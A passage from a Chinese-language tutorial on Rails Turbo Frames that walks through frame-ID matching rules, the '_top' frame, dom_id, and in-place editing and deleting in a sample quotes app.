  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>header<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>Quotes<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>btn btn--primary<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/quotes/new<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>New quote<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>turbo-frame</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>如我们看到的，<code>turbo_frame_tag helper</code>帮助我们创建了<turbo-frame>自定义标签，其中id就是我们传递给helper的第一个参数。</p>
<p><turbo-frame>标签并不存在于HTML官方定义中，这是<code>Turbo JavaScript Library</code>中定义的元素。它拦截 <code>form submissions and clicks on links</code>，让这些frames成为你网页的独立部分！</p>
<p>现在点击<code>New quote</code>按钮，页面上被turbo-frame嵌套的部分消失了，并且浏览器控制台显示：<code>Response has no matching &lt;turbo-frame id=&quot;first_turbo_frame&quot;&gt; element</code>，让我们来解释这奇怪的现象。</p>
<h3 id="Turbo-Frames-cheat-sheet"><a href="#Turbo-Frames-cheat-sheet" class="headerlink" title="Turbo Frames cheat sheet"></a>Turbo Frames cheat sheet</h3><p>这一部分我们将探索一些应用于<code>Turbo Frames</code>的规则</p>
<p>尽管我们的例子都是 Links ， 不过同样适用于 Forms</p>
<hr>
<p><strong>规则1：</strong>当你点击一个嵌套<code>Turbo Frame</code>的超链接，<code>Turbo</code>期待在目标页面中有一个相同ID的<code>frame</code>，然后目标页面的 <code>frame</code>内容将会替换原页面中的<code>frame</code>内容。</p>
<p>单纯去说，会比较难懂，我们来画一些草图，来更好的理解</p>
<p>现在的<code>Quotes#index</code>页面长这个样子：</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/7ce595524b517a5faed2da331dfa662d.png" alt="img"></p>
<p>现在我们用同样的ID嵌套<code>Quotes#new</code>页面片段</p>
<p>为了匹配草图的内容，我们现在改改代码</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">&lt;%# app/views/quotes/new.html.erb %>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>main</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
  &lt;%= link_to sanitize("<span class="token entity named-entity" title="&larr;">&amp;larr;</span> Back to quotes"), quotes_path %>

  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>header<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>New quote<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>

  &lt;%= turbo_frame_tag "first_turbo_frame" do %>
    &lt;%= render "form", quote: @quote %>
  &lt;% end %>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>main</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>现在我们在浏览器中试试，当我们刷新<code>Quotes#index</code>页面，并且点击<code>New quote</code>按钮时，你会发现<code>Quotes#new</code>页面中被嵌套的内容，替换了<code>Quotes#index</code>页面中相同id的内容。</p>
<hr>
<p><strong>规则2：</strong>当你点击一个嵌套了<code>Turbo Frame</code>的超链接，但目标页面没有相同ID的frame，原先页面中嵌套的frame消失，并且以日志的形式响应异常信息，显示在控制台中。</p>
<p>还记得我们上面遇到的奇怪现象吗？这就是因为规则二导致的，如果你在<code>Quotes#new</code>的form上，再写其他ID的frame，刷新页面，并点击<code>New quote</code>，就会看到异常日志再次出现。</p>
<hr>
<p><strong>规则3：</strong>link 可以指定另外一个frame id去串联内容</p>
<p>这个规则很有用，但需要更多的草图去理解它，我们现在使用id为second_frame的Turbo Frame去嵌套quote列表，在<code>Quotes#index</code>页面</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/ecd2fecc16fc2bcd5f574b44d3c46f97.png" alt="img"></p>
<p>在<code>Quotes#new</code>页面中，让我们使用相同的ID去嵌套表单</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/4ecaf53db21447f056f442c9bd5f030c.png" alt="img"></p>
<p>根据草图，修改我们的源码，我在代码中标记了关键部分</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">&lt;%# app/views/quotes/index.html.erb %>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>main</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
  &lt;%= turbo_frame_tag "first_turbo_frame" do %>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>header<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>Quotes<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>
      &lt;%= link_to "New quote",
                  new_quote_path,
                  &lt;% # 这里是关键，虽然被first_turbo_frame的frame嵌套 %>
                    但是指定了second_frame的frame %>
      						&lt;% # 这里声明，将目标页面中，被id为second_frame嵌套的frame替换，当前页面中相同id的frame部分>&lt;/%>
                  data: &#123; turbo_frame: "second_frame" &#125;,
                  class: "btn btn--primary" %>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
  &lt;% end %>

  &lt;%= turbo_frame_tag "second_frame" do %>
    &lt;%= render @quotes %>
  &lt;% end %>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>main</span><span class="token punctuation">></span></span>
&lt;%# app/views/quotes/new.html.erb %>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>main</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
  &lt;%= link_to sanitize("<span class="token entity named-entity" title="&larr;">&amp;larr;</span> Back to quotes"), quotes_path %>

  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>header<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>New quote<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>

  &lt;%= turbo_frame_tag "second_frame" do %>
    &lt;%= render "form", quote: @quote %>
  &lt;% end %>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>main</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>现在我们再试试，我们访问<code>Quotes#index</code>页面，刷新，点击<code>New quoto</code>按钮，可以看到我们的quotes列表被表单替换掉了。这个就是我们传递的<code> data: &#123; turbo_frame: &quot;second_frame&quot; &#125;</code>发挥的作用。</p>
<hr>
<p><strong>注意：</strong></p>
<p>有一个特殊的frame代表整个页面，但它并不是一个真是的<code>Turbo Frame</code>，但是又很像，所以你基本可以认为是一致的。</p>
<p>比如：如果你想让<code>New quote</code>按钮去替换整个页面，我们可以使用<code>data-turbo-frame=&quot;_top&quot;</code>像下面这样：</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/76e6e2c392b1450c138e8b3521b63608.png" alt="img"></p>
<p>当然每个页面都默认有<code>_top frame</code>，所以<code>Quotes#new</code>也有</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/fa4967e41c2314b3f39f87529a0a1f6e.png" alt="img"></p>
<p>我们该代码试试：</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">&lt;%# app/views/quotes/index.html.erb %>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>main</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
  &lt;%= turbo_frame_tag "first_turbo_frame" do %>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>header<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>Quotes<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>
      &lt;%= link_to "New quote",
                  new_quote_path,
                  data: &#123; turbo_frame: "_top" &#125;,
                  class: "btn btn--primary" %>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
  &lt;% end %>

  &lt;%= render @quotes %>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>main</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>我们可以在<code>Quotes#new</code>页面中添加任意内容，因为浏览器会替换整个页面，例如：我们把<code>Quotes#new</code>页面恢复为最初的样子</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">&lt;%# app/views/quotes/new.html.erb %>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>main</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
  &lt;%= link_to sanitize("<span class="token entity named-entity" title="&larr;">&amp;larr;</span> Back to quotes"), quotes_path %>

  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>header<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>New quote<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>

  &lt;%= render "form", quote: @quote %>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>main</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>现在我们再访问<code>Quotes#indexd</code>页面，并进行添加，可以看到整个页面都被<code>Quotes#new</code>页面替换了，但是url没有变。</p>
<p><strong>当使用</strong><code>**_top**</code><strong>关键词时，页面的URL会改变为目标页面的URL，这与使用常规Turbo Frame时的不同之处。</strong></p>
<hr>
<p>可以看到，Turbo Frames算是Rails开发人员的新增利器，它可以帮助我们切割独立的页面而不需要写什么JS代码。</p>
<p>上面的内容针对我们的项目基本够用了，但我们仍要学习两个东西：</p>
<ul>
<li>怎么将<code>Turbo Frames</code>与<code>Turbo_stream fomat</code>结合使用？</li>
<li>如何对Frames命名，通过良好的约定</li>
</ul>
<p>让我们开始练习，并通过测试，在此之前记得把<code>Quotes#index</code>页面恢复为最初状态</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">&lt;%# app/views/quotes/index.html.erb %>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>main</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>header<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>Quotes<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>
    &lt;%= link_to "New quote", new_quote_path, class: "btn btn--primary" %>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>

  &lt;%= render @quotes %>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>main</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="Editing-quotes-with-Turbo-Frames"><a href="#Editing-quotes-with-Turbo-Frames" class="headerlink" title="Editing quotes with Turbo Frames"></a>Editing quotes with Turbo Frames</h3><p>现在我们先做quotes修改部分使用Turbo Frames，目标就是当点击修改时，edit表单将会替换选中的quote数据。通过上面的学习，这一点很容易做到，但如何给这个Frame起一个好名字呢？</p>
<p>在<code>Quotes#index</code>页面中，每个被Turbo Frame嵌套的quote数据都应该有一个唯一ID，一个好的约定就是：模型单数形式_模型的ID，看我们画一个草图展示：</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/30c97bcce1d6f6ac8f72d1c6611b3ad1.png" alt="img"></p>
<p>假如我们想编辑第二个数据，当我们点击edit时，我们需要<code>Quotes#edit</code>页面被同样的ID frame嵌套</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/953789bb0c5857882861ef8233e70bf0.png" alt="img"></p>
<p>通过合适的命名，当我们点击<code>Quotes#index</code>页面的edit按钮时，嵌套表单的frame将会替换嵌套第二条数据的frame。</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/184c38d3e6f9d417f40e9577a113dda3.png" alt="img"></p>
<p>现在开始代码实现，首先在<code>Quotes#index</code>页面，使用<code>quote_#&#123;quote_id&#125;</code>的frame嵌套住每条数据，而index页面的数据都来源于<code>_quote.html.erb</code>部分，所以我们只需要操作这部分：</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">&lt;%# app/views/quotes/_quote.html.erb %>

&lt;%= turbo_frame_tag "quote_#&#123;quote.id&#125;" do %>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>quote<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    &lt;%= link_to quote.name, quote_path(quote) %>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>quote__actions<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
      &lt;%= button_to "Delete",
                    quote_path(quote),
                    method: :delete,
                    class: "btn btn--light" %>
      &lt;%= link_to "Edit",
                  edit_quote_path(quote),
                  class: "btn btn--light" %>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
&lt;% end %><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>下来是<code>Quotes#edit</code>页面</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">&lt;%# app/views/quotes/edit.html.erb %>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>main</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
  &lt;%= link_to sanitize("<span class="token entity named-entity" title="&larr;">&amp;larr;</span> Back to quote"), quote_path(@quote) %>

  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>header<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>Edit quote<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>

  &lt;%= turbo_frame_tag "quote_#&#123;@quote.id&#125;" do %>
    &lt;%= render "form", quote: @quote %>
  &lt;% end %>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>main</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>通过简单的几行代码，我们就实现了功能，你可以在浏览器中去查看，测试一下提交正常数据，异常数据是否都能正常工作。</p>
<p>不过你可能已经注意到当我们想查看quote详情时，不再起作用，并且当删除时，控制台中会爆出异常。这和上面的规则2有关，我们很快去解决，不过在此之前，我们聊聊<code>dom_id helper</code>帮助我们写出就简洁的Turbo Frame ids。</p>
<h3 id="Turbo-Frames-and-the-dom-id-helper"><a href="#Turbo-Frames-and-the-dom-id-helper" class="headerlink" title="Turbo Frames and the dom_id helper"></a>Turbo Frames and the dom_id helper</h3><p>你可以传递一个字符串或者对象，它能帮助我们转为一个<code>dom_id</code>，比如：</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># If the quote is persisted and its id is 1:</span>
dom_id<span class="token punctuation">(</span><span class="token variable">@quote</span><span class="token punctuation">)</span> <span class="token comment"># => "quote_1"</span>

<span class="token comment"># If the quote is a new record:</span>
dom_id<span class="token punctuation">(</span><span class="token class-name">Quote</span><span class="token punctuation">.</span><span class="token keyword">new</span><span class="token punctuation">)</span> <span class="token comment"># => "new_quote"</span>

<span class="token comment"># Note that the dom_id can also take an optional prefix argument</span>
<span class="token comment"># We will use this later in the tutorial</span>
dom_id<span class="token punctuation">(</span><span class="token class-name">Quote</span><span class="token punctuation">.</span><span class="token keyword">new</span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"prefix"</span></span><span class="token punctuation">)</span> <span class="token comment"># "prefix_new_quote"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><code>turbo_frame_tag helper</code> 自动将对象，转为dom_id，所以我们可以改改之前在<code>Quotes#index</code>和<code>Quotes#edit</code>页面，传递对象即可，下面的代码是等价的：</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token operator">&lt;</span><span class="token operator">%=</span> turbo_frame_tag <span class="token string-literal"><span class="token string">"quote_</span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content"><span class="token variable">@quote</span><span class="token punctuation">.</span>id</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">"</span></span> <span class="token keyword">do</span> <span class="token string-literal"><span class="token string">%>
...
&lt;% end %></span></span>

  <span class="token operator">&lt;</span><span class="token operator">%=</span> turbo_frame_tag dom_id<span class="token punctuation">(</span><span class="token variable">@quote</span><span class="token punctuation">)</span> <span class="token keyword">do</span> <span class="token string-literal"><span class="token string">%>
...
&lt;% end %></span></span>

  <span class="token operator">&lt;</span><span class="token operator">%=</span> turbo_frame_tag <span class="token variable">@quote</span> <span class="token string-literal"><span class="token string">%>
...
&lt;% end %></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>所以我们利用语法糖来改改：</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">&lt;%# app/views/quotes/_quote.html.erb %>

&lt;%= turbo_frame_tag quote do %>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>quote<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    &lt;%= link_to quote.name, quote_path(quote) %>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>quote__actions<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
      &lt;%= button_to "Delete",
                    quote_path(quote),
                    method: :delete,
                    class: "btn btn--light" %>
      &lt;%= link_to "Edit",
                  edit_quote_path(quote),
                  class: "btn btn--light" %>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
&lt;% end %>
&lt;%# app/views/quotes/edit.html.erb %>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>main</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
  &lt;%= link_to sanitize("<span class="token entity named-entity" title="&larr;">&amp;larr;</span> Back to quote"), quote_path(@quote) %>

  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>header<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>Edit quote<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>

  &lt;%= turbo_frame_tag @quote do %>
    &lt;%= render "form", quote: @quote %>
  &lt;% end %>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>main</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>一切工作正常，我们继续。</p>
<h3 id="Showing-and-deleting-quotes"><a href="#Showing-and-deleting-quotes" class="headerlink" title="Showing and deleting quotes"></a>Showing and deleting quotes</h3><p>还是上面的问题：</p>
<ol>
<li>查看quote详情没法正常工作了，数据也消失了，控制台也报错</li>
<li>删除按钮也在控制台报错了</li>
</ol>
<p>现在的<code>Quotes#index</code>页面长下面的样子：</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/a7f51f8b8880ae36e98c2a5502692d31.png" alt="img"></p>
<p>每个数据都被quote_id嵌套，但<code>Quotes#show</code>页面并没有相同的ID</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/a9592b5c2cb19ed7cb403039935f8c59.png" alt="img"></p>
<p>这里我们就使用<code>&quot;_top&quot;</code>来替换整个页面</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">&lt;%# app/views/quotes/_quote.html.erb %>

&lt;%= turbo_frame_tag quote do %>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>quote<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    &lt;%= link_to quote.name,
                quote_path(quote),
                data: &#123; turbo_frame: "_top" &#125; %>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>quote__actions<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
      &lt;%= button_to "Delete",
                    quote_path(quote),
                    method: :delete,
                    class: "btn btn--light" %>
      &lt;%= link_to "Edit",
                  edit_quote_path(quote),
                  class: "btn btn--light" %>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
&lt;% end %><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>再在浏览器中测试，发现第一个问题就解决啦</p>
<p>我们也可以用同样的方式，解决第二个问题：</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">&lt;%# app/views/quotes/_quote.html.erb %>

&lt;%= turbo_frame_tag quote do %>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>quote<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    &lt;%= link_to quote.name,
                quote_path(quote),
                data: &#123; turbo_frame: "_top" &#125; %>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>quote__actions<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
      &lt;%= button_to "Delete",
                    quote_path(quote),
                    method: :delete,
                    form: &#123; data: &#123; turbo_frame: "_top" &#125; &#125;,
                    class: "btn btn--light" %>
      &lt;%= link_to "Edit",
                  edit_quote_path(quote),
                  class: "btn btn--light" %>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
&lt;% end %><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>一切工作良好，但出现了个副作用，比如当我们给第二个数据点击Edit时，这时还没有提交，然后删除下面的数据，则页面所有内容被替换，第二条数据的修改框也就没有了。</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/3c4ad0ed70f3646e667828aed2f9e1ed.png" alt="img"></p>
<p>但我们希望的是删除第三条数据时，不影响其他的数据，Turbo and Rails再次帮助了我们，让我们先删除对Delete按钮做出的修改</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">&lt;%# app/views/quotes/_quote.html.erb %>

&lt;%= turbo_frame_tag quote do %>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>quote<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    &lt;%= link_to quote.name,
                quote_path(quote),
                data: &#123; turbo_frame: "_top" &#125; %>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>quote__actions<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
      &lt;%= button_to "Delete",
                    quote_path(quote),
                    method: :delete,
                    class: "btn btn--light" %>
      &lt;%= link_to "Edit",
                  edit_quote_path(quote),
                  class: "btn btn--light" %>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
